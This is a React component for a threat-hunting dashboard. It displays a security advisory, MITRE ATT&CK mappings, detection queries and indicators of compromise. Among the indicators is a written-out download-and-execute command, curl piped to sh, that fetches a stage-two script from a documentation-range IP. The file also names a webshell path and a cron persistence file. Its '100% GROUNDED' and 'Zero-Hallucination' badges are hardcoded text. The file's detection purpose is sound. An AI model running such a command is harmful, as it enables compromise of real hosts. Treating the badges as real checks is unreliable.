import React, { useState } from 'react'
import {
  FileText, ShieldAlert, Calendar, Terminal, Hash,
  CheckCircle2, AlertTriangle, Layers, ExternalLink,
  ShieldCheck, Cpu, ArrowRight, BookOpen, Bug, Search,
  Radio, Lock
} from 'lucide-react'
import { Advisory } from '../types'

interface AdvisoryDetailViewProps {
  advisory: Advisory
}

export const AdvisoryDetailView: React.FC<AdvisoryDetailViewProps> = ({ advisory }) => {
  const [selectedSentenceId, setSelectedSentenceId] = useState<string | null>('S-1')
  const [activeTab, setActiveTab] = useState<'intel' | 'mitre' | 'hunt_hypotheses'>('intel')

  // MITRE ATT&CK mappings derived from advisory
  const mitreTactics = [
    {
      tactic: 'Initial Access',
      technique: 'T1190',
      name: 'Exploit Public-Facing Application',
      phase: 'Step 1: Web Request',
      evidenceQuery: "source_type = 'web_log' AND (path LIKE '%/api/v1/auth/session%' OR status_code = 500)",
      confidence: 'High (0.98)',
      status: 'Observed in S1, S5'
    },
    {
      tactic: 'Execution',
      technique: 'T1059.004',
      name: 'Command and Scripting Interpreter: Unix Shell',
      phase: 'Step 2: Process Spawn',
      evidenceQuery: "source_type = 'edr' AND process_name IN ('bash', 'sh', 'python3', 'curl', 'wget')",
      confidence: 'High (0.99)',
      status: 'Observed in S1, S5'
    },
    {
      tactic: 'Persistence',
      technique: 'T1505.003',
      name: 'Server Software Component: Web Shell',
      phase: 'Step 3: Post-Exploitation',
      evidenceQuery: "source_type = 'edr' AND file_path LIKE '%.php' AND event_action IN ('file_write', 'process_start')",
      confidence: 'Definitive (1.0)',
      status: 'Observed in S1, S5 (Post-Patch)'
    },
    {
      tactic: 'Persistence',
      technique: 'T1053.003',
      name: 'Scheduled Task/Job: Cron',
      phase: 'Step 4: Persistence Maintenance',
      evidenceQuery: "source_type = 'edr' AND (file_path LIKE '%cron%' OR cmdline LIKE '%cron%')",
      confidence: 'Definitive (1.0)',
      status: 'Observed in S5 (Re-Check Catch)'
    }
  ]

  const sentenceToHypothesisMap: Record<string, { hypothesis: string; querySnippet: string; iocLinked: string }> = {
    'S-1': {
      hypothesis: 'H1: Ingress web-tier exploitation via unauthenticated POST to /api/v1/auth/session',
      querySnippet: "SELECT * FROM telemetry WHERE path = '/api/v1/auth/session' AND status_code = 500",
      iocLinked: '/api/v1/auth/session'
    },
    'S-2': {
      hypothesis: 'H2: Web process spawned suspicious child shells (curl/wget/sh pipes)',
      querySnippet: "SELECT * FROM telemetry WHERE parent_process = 'java' AND process_name IN ('sh','curl')",
      iocLinked: 'curl -fsSL http://198.51.100.42:8080/stage2.sh | sh'
    },
    'S-3': {
      hypothesis: 'H3: Post-exploitation webshell artifact written to disk',
      querySnippet: "SELECT * FROM telemetry WHERE file_path LIKE '%/.sys_cache.php%'",
      iocLinked: '/var/www/html/assets/.sys_cache.php'
    },
    'S-4': {
      hypothesis: 'H4: Secondary outbound lateral communication / C2 beaconing',
      querySnippet: "SELECT * FROM telemetry WHERE dest_ip IN ('198.51.100.42', '203.0.113.88')",
      iocLinked: '198.51.100.42, 203.0.113.88'
    },
    'S-5': {
      hypothesis: 'H4.2: Post-patch persistence execution via crontab entry',
      querySnippet: "SELECT * FROM telemetry WHERE cmdline LIKE '%/etc/cron.d/sync_worker%'",
      iocLinked: '/etc/cron.d/sync_worker'
    }
  }

  return (
    <div className="flex-1 p-6 space-y-5 max-w-7xl mx-auto w-full font-sans">
      {/* CISA KEV / Threat Intelligence Header Banner */}
      <div className="soc-card p-5 rounded-2xl space-y-4 shadow-sm">
        <div className="flex flex-col md:flex-row md:items-center justify-between gap-3 pb-3 border-b border-[#d8ecea]">
          <div className="flex items-center gap-2.5 flex-wrap">
            <span className="text-[10px] font-mono px-2 py-0.5 rounded font-black tracking-wider bg-rose-50 text-rose-700 border border-rose-200 uppercase">
              CISA KEV · ACTIVE EXPLOITATION
            </span>
            <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-[#e0f2f1] text-[#0d766e] border border-[#a7f3d0] font-semibold">
              ID: {advisory.id}
            </span>
            <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-[#f0f7f6] text-[#143e4c] border border-[#d2e8e5]">
              RFC 8785 CANONICAL EXTRACT
            </span>
            <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-emerald-50 text-emerald-800 border border-emerald-200 flex items-center gap-1 font-semibold">
              <Lock className="w-3 h-3 text-[#0d9488]" /> INPUT SCREENED (0% INJECTION)
            </span>
          </div>

          <div className="flex items-center gap-2">
            <span className="text-xs font-mono text-[#557784]">CVSS v3.1 Base Score:</span>
            <span className="text-sm font-mono font-black text-rose-700 px-2 py-0.5 rounded bg-rose-50 border border-rose-200">
              9.8 CRITICAL
            </span>
          </div>
        </div>

        <div>
          <h1 className="text-xl md:text-2xl font-black text-[#113644] tracking-tight">
            {advisory.title}
          </h1>
          <p className="text-xs font-mono text-[#527482] mt-1 flex items-center gap-2 flex-wrap">
            <span>Vendor: <strong className="text-[#143e4c]">{advisory.vendor}</strong></span>
            <span>·</span>
            <span>Product: <strong className="text-[#0d9488]">{advisory.product}</strong></span>
            <span>·</span>
            <span>Vector: <code className="text-[#143e4c] text-[11px] bg-[#f0f7f6] px-1 py-0.5 rounded border border-[#d2e8e5]">CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</code></span>
          </p>
        </div>

        {/* Threat Timeline Strip */}
        <div className="grid grid-cols-2 md:grid-cols-4 gap-2 pt-2 border-t border-[#d8ecea] font-mono text-xs">
          <div className="p-2.5 rounded-lg bg-[#f0f7f6] border border-[#d2e8e5]">
            <span className="text-[#557784] text-[10px] block font-bold">AFFECTED VERSIONS:</span>
            <span className="font-bold text-rose-700 mt-0.5 block truncate">
              {advisory.affected_versions.join(' & ')}
            </span>
          </div>
          <div className="p-2.5 rounded-lg bg-[#f0f7f6] border border-[#d2e8e5]">
            <span className="text-[#557784] text-[10px] block font-bold">FIRST EXPLOIT IN WILD:</span>
            <span className="font-bold text-amber-800 mt-0.5 block">
              {advisory.first_known_exploitation_date.slice(0, 10)} (-5d zero-day)
            </span>
          </div>
          <div className="p-2.5 rounded-lg bg-[#f0f7f6] border border-[#d2e8e5]">
            <span className="text-[#557784] text-[10px] block font-bold">PUBLIC DISCLOSURE:</span>
            <span className="font-bold text-[#0d9488] mt-0.5 block">
              {advisory.disclosure_date.slice(0, 10)}
            </span>
          </div>
          <div className="p-2.5 rounded-lg bg-[#f0f7f6] border border-[#d2e8e5]">
            <span className="text-[#557784] text-[10px] block font-bold">MANDATED LOOKBACK:</span>
            <span className="font-bold text-[#143e4c] mt-0.5 block">
              45 Days Historical Depth
            </span>
          </div>
        </div>
      </div>

      {/* Navigation Tabs */}
      <div className="flex items-center gap-2 border-b border-[#d8ecea] pb-2 font-mono text-xs">
        <button
          onClick={() => setActiveTab('intel')}
          className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg transition font-semibold ${
            activeTab === 'intel'
              ? 'bg-[#143e4c] text-white shadow-xs'
              : 'text-[#446876] hover:text-[#113644] hover:bg-[#e4f1f0]'
          }`}
        >
          <FileText className="w-3.5 h-3.5" />
          Sentence-Level Citations & Provable Grounding
        </button>
        <button
          onClick={() => setActiveTab('mitre')}
          className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg transition font-semibold ${
            activeTab === 'mitre'
              ? 'bg-[#143e4c] text-white shadow-xs'
              : 'text-[#446876] hover:text-[#113644] hover:bg-[#e4f1f0]'
          }`}
        >
          <Layers className="w-3.5 h-3.5" />
          MITRE ATT&CK Matrix Mapping
        </button>
        <button
          onClick={() => setActiveTab('hunt_hypotheses')}
          className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg transition font-semibold ${
            activeTab === 'hunt_hypotheses'
              ? 'bg-[#143e4c] text-white shadow-xs'
              : 'text-[#446876] hover:text-[#113644] hover:bg-[#e4f1f0]'
          }`}
        >
          <Terminal className="w-3.5 h-3.5" />
          Extracted Hunt Hypotheses (H1–H4)
        </button>
      </div>

      {/* Tab 1: Sentence-Level Citation Linking */}
      {activeTab === 'intel' && (
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-5 font-mono text-xs">
          {/* Left Column: Sentences list */}
          <div className="lg:col-span-7 space-y-3">
            <div className="flex items-center justify-between">
              <span className="text-[11px] font-bold text-[#143e4c] uppercase tracking-wider">
                Extracted Source Sentences (Click to Trace Evidence)
              </span>
              <span className="text-[10px] text-[#557784]">
                Strict provenance tracking
              </span>
            </div>

            <div className="space-y-2">
              {advisory.source_sentences.map((sent) => {
                const isSelected = selectedSentenceId === sent.id
                return (
                  <div
                    key={sent.id}
                    onClick={() => setSelectedSentenceId(sent.id)}
                    className={`p-3.5 rounded-xl border transition cursor-pointer shadow-2xs ${
                      isSelected
                        ? 'bg-[#e0f2f1] border-[#0d9488] shadow-sm'
                        : 'bg-white border-[#d2e8e5] hover:border-[#99d5cf] hover:bg-[#f6fbfa]'
                    }`}
                  >
                    <div className="flex items-center justify-between mb-1.5">
                      <span className={`px-2 py-0.5 rounded text-[10px] font-bold ${
                        isSelected
                          ? 'bg-[#143e4c] text-white'
                          : 'bg-[#eaf4f3] text-[#143e4c] border border-[#cbe4e1]'
                      }`}>
                        SENTENCE {sent.id}
                      </span>
                      <span className="text-[10px] text-[#638491]">
                        Verified by Canonical Lexer
                      </span>
                    </div>
                    <p className="text-[#254d5b] font-sans text-xs leading-relaxed font-medium">
                      "{sent.sentence}"
                    </p>
                  </div>
                )
              })}
            </div>
          </div>

          {/* Right Column: Sentence to Hunt Mapping Inspector */}
          <div className="lg:col-span-5 space-y-3">
            <div className="text-[11px] font-bold text-[#143e4c] uppercase tracking-wider">
              Cryptographic Claim Grounding
            </div>

            {selectedSentenceId && sentenceToHypothesisMap[selectedSentenceId] ? (
              <div className="soc-card p-4 rounded-xl border border-[#bfe0dc] space-y-3 shadow-sm">
                <div className="flex items-center justify-between pb-2 border-b border-[#e2efee]">
                  <span className="text-[#143e4c] font-bold">Citation Target: {selectedSentenceId}</span>
                  <span className="text-[10px] px-2 py-0.5 rounded bg-emerald-50 text-emerald-800 border border-emerald-200 font-bold">
                    100% GROUNDED
                  </span>
                </div>

                <div>
                  <span className="text-[#557784] text-[10px] block font-semibold">DERIVED HUNT HYPOTHESIS:</span>
                  <p className="text-[#113644] font-semibold mt-0.5">
                    {sentenceToHypothesisMap[selectedSentenceId].hypothesis}
                  </p>
                </div>

                <div>
                  <span className="text-[#557784] text-[10px] block font-semibold">CORRESPONDING DUCKDB QUERY:</span>
                  <pre className="p-2.5 rounded bg-[#f0f7f6] border border-[#d2e8e5] text-[#0d766e] text-[11px] overflow-x-auto mt-1 font-mono">
                    {sentenceToHypothesisMap[selectedSentenceId].querySnippet}
                  </pre>
                </div>

                <div>
                  <span className="text-[#557784] text-[10px] block font-semibold">EXTRACTED IOC TOKEN:</span>
                  <code className="text-amber-900 text-xs bg-amber-50 px-2 py-1 rounded border border-amber-200 block mt-1 break-all select-all font-mono font-semibold">
                    {sentenceToHypothesisMap[selectedSentenceId].iocLinked}
                  </code>
                </div>

                <div className="p-2.5 rounded bg-[#e0f2f1] border border-[#a7f3d0] text-[11px] text-[#0d766e] font-sans">
                  <ShieldCheck className="w-3.5 h-3.5 text-[#0d9488] inline mr-1" />
                  <strong>Zero-Hallucination Guarantee:</strong> This hypothesis cannot run without explicit textual confirmation in advisory sentence <strong>{selectedSentenceId}</strong>.
                </div>
              </div>
            ) : (
              <div className="soc-card p-6 rounded-xl border border-[#d2e8e5] text-center text-[#638491]">
                Select a sentence on the left to inspect its derived hunt query.
              </div>
            )}

            {/* Extracted IOCs Card */}
            <div className="soc-card p-4 rounded-xl border border-[#d2e8e5] space-y-2 shadow-2xs">
              <span className="text-[#143e4c] font-bold flex items-center gap-1.5 text-xs">
                <Hash className="w-3.5 h-3.5 text-[#0d9488]" /> Complete IOC Register (4 items):
              </span>
              <div className="space-y-1">
                {advisory.indicators.map((ioc, idx) => (
                  <div key={idx} className="p-2 rounded bg-[#f0f7f6] border border-[#d2e8e5] text-[#254d5b] text-[11px] select-all flex items-center justify-between">
                    <code>{ioc}</code>
                    <span className="text-[10px] text-[#0d766e] font-bold">HUNT-MATCH</span>
                  </div>
                ))}
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Tab 2: MITRE ATT&CK Matrix */}
      {activeTab === 'mitre' && (
        <div className="space-y-4 font-mono text-xs">
          <div className="soc-card p-4 rounded-xl border border-[#d2e8e5] flex items-center justify-between shadow-xs">
            <div>
              <h3 className="font-bold text-[#113644] text-sm">Enterprise MITRE ATT&CK Alignment</h3>
              <p className="text-xs text-[#527482] font-sans mt-0.5">
                Every forensic hunting hypothesis corresponds to a standardized adversarial tactic, technique, and telemetry source.
              </p>
            </div>
            <span className="px-3 py-1 rounded bg-[#eaf4f3] text-[#0d766e] border border-[#a7f3d0] text-xs font-bold">
              v14 Enterprise
            </span>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {mitreTactics.map((m, idx) => (
              <div key={idx} className="soc-card p-4 rounded-xl border border-[#d2e8e5] space-y-2.5 shadow-2xs">
                <div className="flex items-center justify-between">
                  <span className="px-2 py-0.5 rounded bg-[#eaf4f3] text-[#143e4c] border border-[#cbe4e1] text-[10px] font-bold">
                    {m.technique} · {m.tactic.toUpperCase()}
                  </span>
                  <span className="text-[10px] text-[#0d766e] font-bold">
                    Confidence: {m.confidence}
                  </span>
                </div>

                <h4 className="text-sm font-bold text-[#113644]">{m.name}</h4>
                <div className="text-[11px] text-[#527482] font-sans">
                  Attack Phase: <strong className="text-[#143e4c]">{m.phase}</strong>
                </div>

                <div className="p-2.5 rounded bg-[#f0f7f6] border border-[#d2e8e5] space-y-1">
                  <span className="text-[10px] text-[#557784] block font-bold">COLUMNAR SEARCH QUERY:</span>
                  <code className="text-[#0d766e] text-[11px] block break-all font-mono">
                    {m.evidenceQuery}
                  </code>
                </div>

                <div className="text-[11px] text-[#527482] pt-1 border-t border-[#e2efee] flex items-center justify-between">
                  <span>Simulated Presence:</span>
                  <span className="text-amber-800 font-bold">{m.status}</span>
                </div>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* Tab 3: Extracted Hunt Hypotheses (H1-H4) & Cleanup Notes */}
      {activeTab === 'hunt_hypotheses' && (
        <div className="grid grid-cols-1 md:grid-cols-2 gap-5 font-mono text-xs">
          <div className="soc-card p-4 rounded-xl border border-[#d2e8e5] space-y-3 shadow-xs">
            <h4 className="font-bold text-[#113644] flex items-center gap-2 text-sm border-b border-[#e2efee] pb-2">
              <Terminal className="w-4 h-4 text-[#0d9488]" />
              Automated Forensic Hunt Engine
            </h4>
            <div className="space-y-2.5">
              <div className="p-3 rounded-lg bg-[#f0f7f6] border border-[#d2e8e5] space-y-1">
                <span className="text-[#0d9488] font-bold block">H1: Ingress Web Exploit</span>
                <p className="text-[#3b5d6b] text-xs font-sans">
                  Scans Nginx, Apache, and Cloudflare access logs for <code className="text-[#143e4c] font-semibold">/api/v1/auth/session</code> with 500 error code.
                </p>
              </div>
              <div className="p-3 rounded-lg bg-[#f0f7f6] border border-[#d2e8e5] space-y-1">
                <span className="text-[#0d9488] font-bold block">H2: Shell Execution</span>
                <p className="text-[#3b5d6b] text-xs font-sans">
                  Scans EDR process telemetry for Java parent processes spawning <code className="text-[#143e4c] font-semibold">bash</code>, <code className="text-[#143e4c] font-semibold">curl</code>, or <code className="text-[#143e4c] font-semibold">wget</code>.
                </p>
              </div>
              <div className="p-3 rounded-lg bg-[#f0f7f6] border border-[#d2e8e5] space-y-1">
                <span className="text-[#0d9488] font-bold block">H3: Webshell Drop</span>
                <p className="text-[#3b5d6b] text-xs font-sans">
                  Scans filesystem modifications for <code className="text-[#143e4c] font-semibold">.sys_cache.php</code> within webroot directory trees.
                </p>
              </div>
              <div className="p-3 rounded-lg bg-[#f0f7f6] border border-[#d2e8e5] space-y-1">
                <span className="text-[#0d9488] font-bold block">H4: Lateral Pivot & Egress</span>
                <p className="text-[#3b5d6b] text-xs font-sans">
                  Scans NetFlow/VPC flow logs for outbound connections to adversary C2 IP <code className="text-[#143e4c] font-semibold">198.51.100.42</code>.
                </p>
              </div>
            </div>
          </div>

          <div className="soc-card p-4 rounded-xl border border-[#d2e8e5] space-y-3 shadow-xs">
            <h4 className="font-bold text-[#0f766e] flex items-center gap-2 text-sm border-b border-[#e2efee] pb-2">
              <CheckCircle2 className="w-4 h-4 text-[#0d9488]" />
              Required Post-Patch Remediation Playbook
            </h4>
            <p className="text-[#4f717f] text-xs font-sans">
              Critical operational mandate: Patching binary packages alone leaves attacker backdoors active. The following remediation actions are strictly enforced before Patch Gate clearance:
            </p>
            <div className="space-y-2">
              {advisory.cleanup_notes.map((note, idx) => (
                <div key={idx} className="p-2.5 rounded bg-[#f0f7f6] border border-[#d2e8e5] flex items-start gap-2.5">
                  <span className="w-5 h-5 rounded-full bg-[#143e4c] text-white text-[10px] font-bold flex items-center justify-center shrink-0 mt-0.5">
                    {idx + 1}
                  </span>
                  <span className="text-[#254d5b] text-xs font-sans leading-relaxed">
                    {note}
                  </span>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
